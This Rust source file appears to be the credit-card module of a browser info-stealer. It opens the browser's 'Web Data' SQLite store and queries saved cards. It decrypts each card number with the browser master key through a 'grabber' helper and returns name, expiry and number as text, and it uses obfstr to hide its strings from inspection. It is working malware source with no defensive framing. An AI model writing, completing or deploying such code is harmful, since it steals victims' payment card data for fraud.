use crate::browser::utils::{Profiles, Browser, is_opera};
use rusqlite::{params, Connection};
use obfstr::obfstr as obf;

pub fn get(browser: &Browser, profile: &str) -> Vec<String> {
    let autofill_path = is_opera(&browser.name, &browser.path, profile.to_string(), obf!("\\Web Data").to_string());

    if let Err(_) = std::fs::metadata(&autofill_path) {
        return Vec::new();
    }
    
    let mut autofill: Vec<String> = Vec::new();
    let conn = Connection::open(&autofill_path).unwrap();
    let mut stmt = conn
        .prepare(obf!("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"))
        .unwrap();
    let mut rows = stmt.query([]).unwrap();

    while let Ok(row_result) = rows.next() {
        if let Some(row) = row_result {
            let name_on_card: String = row.get(0).unwrap();
            let expiration_month: usize = row.get(1).unwrap();
            let expiration_year: usize = row.get(2).unwrap();
            let card_number_encrypted: Vec<u8> = row.get(3).unwrap();

            if let Ok(value) = crate::grabber::grabber::decrypt_tokens(&card_number_encrypted, &browser.masterkey) {
                if !(name_on_card.is_empty() || expiration_month <= 0|| expiration_year <= 0 || value.is_empty()) {
                    autofill.push(format!(
                        "{}\t{}/{}\t{}",
                        name_on_card,
                        expiration_month,
                        expiration_year,
                        value.replace(" ", "-"),
                    ));
                }
            }
        } else {
            break;
        }
    }
    autofill
}